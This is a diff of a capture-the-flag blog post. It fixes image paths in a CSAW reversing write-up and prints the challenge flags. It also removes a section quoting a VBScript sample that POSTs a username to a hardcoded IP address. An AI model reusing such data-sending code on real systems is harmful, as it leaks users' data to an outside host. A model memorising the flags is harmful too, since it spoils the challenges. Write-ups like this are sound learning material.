@@ -11,13 +11,13 @@ date:   2023-09-18 09:41:40 +0530
 ```Description:-```
 Can't seem to print out the flag :( Can you figure out how to get the flag with this binary?
 
-```Challenge File:``` [file](./CSAW/test.out)
+```Challenge File:``` [file](/assests/CSAW/test.out)
 
 This challenge was beginner level reversing challenge. To see the decompiled code, open the provided binary in IDA and press F5.
-![source-code](./CSAW/source-code.png)
+![source-code](/assets/CSAW/source-code.png)
 According to the coed, the user is expected to input a 12-character string, and if the string length matches, they will receive a flag in response to the input.
 Now run the binary and give any 12-character input and you'll get the flag.
-![rev1flag](./CSAW/rev1flag.png)
+![rev1flag](/assets/CSAW/rev1flag.png)
 Flag:- ```csawctf{c20ad4d76fe97759aa27a0c99bff6710}```
 
 
@@ -25,35 +25,8 @@ Flag:- ```csawctf{c20ad4d76fe97759aa27a0c99bff6710}```
 
 
 
-{% highlight ruby %}
- Dim http: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
- Dim url: url = "http://20.106.250.46/sendUserData"
 
- With http
-  Call .Open("POST", url, False)
-  Call .SetRequestHeader("Content-Type", "application/json")
-  Call .Send("{""username"":""" & strUser & """}")
- End With
-
- res = Msgbox("Thank you for your cooperation!", vbOKOnly+vbInformation, "")
-{% endhighlight %}
-
-From above snippet, it seems that POST request is to be sent to the given URL, after setting request header `Content-Type` to `application/json` and sending json payload
-
-{% highlight ruby %}
- {
-   "username":"admin"
- }   
-{% endhighlight %}
-
-I set username to `admin` and bravo !! I got the key..
-
- ![Key](./DefCon/image.png)
  
-So with the key we XORed the downloaded XORed flag.png and yesss.. we got the flag !!
- ![Flag](./DefCon/flag.png)
- 
-Flag :- `SEKAI{so_i_guess_we'll_get_more_better_next_year-_-}`
 
  
  
